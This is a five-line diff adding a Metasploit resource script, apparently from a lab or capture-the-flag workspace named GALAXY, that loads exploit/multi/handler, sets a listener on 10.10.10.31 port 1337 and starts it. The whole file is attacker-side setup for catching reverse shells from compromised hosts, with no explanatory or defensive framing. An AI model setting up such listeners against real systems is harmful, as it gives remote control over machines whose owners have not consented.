@@ -1,0 +1,5 @@
+workspace GALAXY
+use exploit/multi/handler
+set LHOST 10.10.10.31
+set LPORT 1337
+exploit
